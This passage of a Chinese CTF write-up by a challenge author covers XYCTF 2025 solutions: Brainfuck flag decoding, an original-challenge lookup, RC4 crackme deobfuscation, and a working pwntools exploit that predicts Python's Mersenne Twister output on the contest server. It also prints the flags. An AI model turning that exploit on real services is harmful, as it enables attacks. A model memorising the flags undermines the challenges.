ysrKysrKysrKysrKytbPCsrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrK1s8KysrPi0rLSstKy1dPFstXT4rKysrKysrKysrK1s8KysrKysrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKytbPCsrPi0rLSstKy1dPFstXT4rKysrKysrK1s8KysrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrK1s8KysrKys+LSstKy0rLV08Wy1dPisrKysrKysrKysrKysrKysrKytbPCsrKysrPi0rLSstKy1dPFstXT4rKysrKysrWzwrKysrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8KysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKytbPCsrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrK1s8KysrKys+LSstKy0rLV08Wy1d](https://ashupk.github.io/Brainfuck/brainfuck-visualizer-master/index.html#PisrKysrKysrKysrKysrKysrWzwrKysrKys+LSstKy0rLV08Wy1dPisrKysrKysrKysrK1s8KysrKysrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrWzwrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrWzwrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8KysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8KysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrK1s8KysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKytbPCsrKysrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8Kz4tKy0rLSstXTxbLV0+KysrKysrKytbPCsrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8Kz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKytbPCs+LSstKy0rLV08Wy1dPisrKysrKysrKysrKysrKysrKytbPCsrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8KysrKz4tKy0rLSstXTxbLV0+KysrKysrKytbPCsrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrK1s8KysrKys+LSstKy0rLV08Wy1dPisrKysrKysrKysrWzwrKysrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKytbPCs+LSstKy0rLV08Wy1dPisrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKytbPCs+LSstKy0rLV08Wy1dPisrKysrKysrKysrK1s8KysrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrK1s8KysrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrK1s8KysrKys+LSstKy0rLV08Wy1dPisrKysrKysrKytbPCsrKysrPi0rLSstKy1dPFstXT4rKysrKysrK1s8KysrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrWzwrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKytbPCs+LSstKy0rLV08Wy1dPisrKysrKysrKysrKysrKysrKytbPCsrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrK1s8KysrPi0rLSstKy1dPFstXT4rKysrKysrKysrK1s8KysrKysrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKytbPCsrPi0rLSstKy1dPFstXT4rKysrKysrK1s8KysrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrK1s8KysrKys+LSstKy0rLV08Wy1dPisrKysrKysrKysrKysrKysrKytbPCsrKysrPi0rLSstKy1dPFstXT4rKysrKysrWzwrKysrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8KysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKytbPCsrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrK1s8KysrKys+LSstKy0rLV08Wy1d)

发现1号寄存器的极大值就是flag字母的ascii。奇数和偶数有两种不同的编码方式。我们很容易就能写出来：

```
import sympy

def reverse_bf(bf_code):
    flag = []
    i = 0
    n = len(bf_code)
    while i < n:
        if bf_code[i] == '>':
            # Start of a new segment
            i += 1
            # Count x
            x = 0
            while i < n and bf_code[i] == '+':
                x += 1
                i += 1
            # Expect '[<'
            if i >= n or bf_code[i] != '[' or bf_code[i+1] != '<':
                raise ValueError("Invalid BF segment")
            i += 2
            # Count y
            y = 0
            while i < n and bf_code[i] == '+':
                y += 1
                i += 1
            # Expect '>-+-+-+-]'
            remaining = bf_code[i:i+9]
            if remaining != '>-+-+-+-]':
                raise ValueError("Invalid BF segment")
            i += 9
            # Expect '<[-]'
            if bf_code[i:i+4] != '<[-]':
                raise ValueError("Invalid BF segment")
            i += 4
            # Calculate character
            char = chr(x * y)
            flag.append(char)
        else:
            i += 1
    return ''.join(flag)

print(reverse_bf('')) # 写题目的bf源码
```

![](/images/migrated/18730353/18.png)

`flag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}`

签到。

# MISC-XGCTF

## 出题灵感

如题。LamentXU在出题的时候，从某场比赛拉了道原题下来改了改，结果传文件的时候传错了传成原题了。

## 题解

![](/images/migrated/18730353/19.png)

下载下来随便查一下，发现其实就是CISCN华东南的WEB题，名字都是一样的。

按照题目名称搜能搜到

[https://dragonkeeep.top/category/CISCN华东南WEB-Polluted/](https://dragonkeeep.top/category/CISCN%E5%8D%8E%E4%B8%9C%E5%8D%97WEB-Polluted/)

flag在注释里。

![](/images/migrated/18730353/20.png)

博客是github page。所以也可以去看commit记录。

`flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me}`

我以后投题目一定检查www

# CRYPTO-division

## 出题灵感

相当基础的梅森素数预测。简单到有点让人难以相信了。出这题主要是因为adwa的题太沟把难了，所以防止爆0出的。

## 题解

```
# -*- encoding: utf-8 -*-
'''
@File    :   server.py
@Time    :   2025/03/20 12:25:03
@Author  :   LamentXU 
'''
import random 
print('----Welcome to my division calc----')
print('''
menu:
      [1]  Division calc
      [2]  Get flag
''')
while True:
    choose = input(': >>> ')
    if choose == '1':
        try:
            denominator = int(input('input the denominator: >>> '))
        except:
            print('INPUT NUMBERS')
            continue
        nominator = random.getrandbits(32)
        if denominator == '0':
            print('NO YOU DONT')
            continue
        else:
            print(f'{nominator}//{denominator} = {nominator//denominator}')
    elif choose == '2':
        try:
            ans = input('input the answer: >>> ')
            rand1 = random.getrandbits(11000)
            rand2 = random.getrandbits(10000)
            correct_ans = rand1 // rand2
            if correct_ans == int(ans):
                print('WOW')
                with open('flag', 'r') as f:
                    print(f'Here is your flag: {f.read()}')
            else:
                print(f'NOPE, the correct answer is {correct_ans}')
        except:
            print('INPUT NUMBERS')
    else:
        print('Invalid choice')
```

只要一直除1就可以获得服务器生成的随机数。然后交给Randcrack，预测出两个getrandbits除一下交上去就行了。

### exp

```
from pwn import *
from randcrack import RandCrack
from tqdm import tqdm
# context.log_level = 'debug'
rc = RandCrack()
p = remote('gz.imxbt.cn',20261)
# p = process(['python', 'server.py'])
p.recvuntil(b'flag')
for i in tqdm(range(624)):
    p.sendline(b'1')
    p.sendlineafter(b'>>> ',b'1')
    rand = p.recvline().decode().split('=')[-1]
    rand = rand.replace(' ', '')
    rc.submit(int(rand))
p.sendline(b'2')
rand1 = rc.predict_getrandbits(11000)
rand2 = rc.predict_getrandbits(10000)
print(rand1//rand2)
p.recvuntil(b'>>> ')
p.sendline(str(rand1//rand2).encode())
p.interactive()
```

![](/images/migrated/18730353/21.png)

虽然最后flag是动态的但是我还是要把我原来的flag贴上来（bushi）

`flag{I_do_not_want_any_CTFER_get_0_solve_in_Crypto_bad_bad_adwa}`

# REVERSE-WARMUP

## 出题灵感

出这题的动机跟上一题是一样的。主要是因为re✌出的题都太几把难了。所以出个防止爆0的题目。加密算法写的特别简单，混淆只有一层。预期解数和参赛人数一样多了。

## 题解

直接正则匹配把chr拆出来。

```
import re

code = "Execute(chr( 667205/8665 ) & chr( -7671+7786 ) & chr( 8541-8438 ) & chr( 422928/6408 ) & chr( -1948+2059 ) & chr( -3066+3186 ) & chr( 756-724 ) & chr( 4080/120 ) & chr( -3615+3683 ) & chr( -1619+1720 ) & chr( -2679+2776 ) ......"  # 省略

expressions = re.findall(r"chr\(([^)]+)\)", code)

result = ""
for expr in expressions:
    try:

        value = int(eval(expr))
        result += chr(value)
    except:
        pass

print(result)
```

然后就能看到源代码：

```
MsgBox "Dear CTFER. Have fun in XYCTF 2025!"
flag = InputBox("Enter the FLAG:", "XYCTF")
wefbuwiue = "90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4" ' C4
qwfe = "rc4key"

' RC4
Function RunRC(sMessage, strKey)
    Dim kLen, i, j, temp, pos, outHex
    Dim s(255), k(255)

    ' ?
    kLen = Len(strKey)
    For i = 0 To 255
        s(i) = i
        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) ' ASCII
    Next

    ' KSA
    j = 0
    For i = 0 To 255
        j = (j + s(i) + k(i)) Mod 256
        temp = s(i)
        s(i) = s(j)
        s(j) = temp
    Next

    ' PRGA
    i = 0 : j = 0 : outHex = ""
    For pos = 1 To Len(sMessage)
        i = (i + 1) Mod 256
        j = (j + s(i)) Mod 256
        temp = s(i)
        s(i) = s(j)
        s(j) = temp

        ' ?
        Dim plainChar, cipherByte
        plainChar = Asc(Mid(sMessage, pos, 1)) ' SCII
        cipherByte = s((s(i) + s(j)) Mod 256) Xor plainChar
        outHex = outHex & Right("0" & Hex(cipherByte), 2)
    Next

    RunRC = outHex
End Function

'
If LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) Then
    MsgBox "Congratulations! Correct FLAG!"
Else
    MsgBox "Wrong flag."
End If
```

就是一个基础的RC4。密钥是`rc4key`，甚至密钥名字都指示了加密算法了。

简单看一下发现甚至没有魔改。整个在线解密：[https://www.mklab.cn/utils/rc4](https://www.mklab.cn/utils/rc4)

![](/images/migrated/18730353/22.png)

`flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn's_chall_is_r3@lly_gr3@t_&_fuN!}`

# 技术之外......

后面就是一些垃圾话。但还是写写吧，毕竟前面那么多都写了。

## 关于作弊

XYCTF被喷闲鱼CTF还是有道理的。这次因为我个人要考试的原因，所以反作弊力度其实没那么大。但是你们发给我的wp（不管是单题的还是总的）我都有一个字一个字看。

比赛过程中，有人直接拿我的`Signin`去发文，有人直接抄我的`签个到吧`去给工具做宣传，更有甚者直接把payload发到大群里去问。Fate单题的py率大约在1/3（保守估计）。所以这比赛拿不到奖不用灰心，本来就是公益比赛，能学到东西就是最好的。

## 关于问卷

问卷是我做的。每一份问卷和建议我都有仔细地去看。就我主出的方向（WEB）我大概能归出以下建议：

### 考点单一

很多师傅提到这次只有python题，甚至于有好多python SSTI题。这里真的是给大家说声抱歉。因为XYCTF作为公益比赛出题是没有报酬的。所以作为出题比较费劲的WEB方向往往找不到人出。最后大部分WEB都是我出的。而我个人水平相当有限——我能拿出来考大家的只有SSTI了。

明年会多摇点web师傅的哈。

### 过于困难

唔，当时出题的时候确实是没有想到要去设计难度梯度这种事情>\_<。

以后再出题的话可能会标记上难度，这样大家做的时候也舒服点。

## 最后的话

所有题目附件&docker均在github上开源。所有题目环境均可以在SFTian✌的复现平台上免费使用！再次强调：如果要将这些题目拿去上到其他平台，请注明作者：`LamentXU`

其实我本来还出了一个AI的论文题，但是后来因为靶机实在顶不住下了，也确实是考虑不周吧。第一次出题，很多地方还是很不熟悉。这次基本上所有的dockerfile都是SFTian✌给我写的）（（

据出题组的师傅们说这次抽象的题都让我出了www（牢大家我真的很抱歉>\_<）。我这次已经尽可能让题目变得有趣一些了。而且我（自认为）没有脑洞的地方。但是的确有好多地方考的很偏的知识点，导致牢完了。不过整体我出的题目难度其实也没那么高啦，看完wp之后（应该）都这么觉得吧（小声）。

最后希望师傅们玩的开心！

**Happy Hacking In XYCTF 2025！**
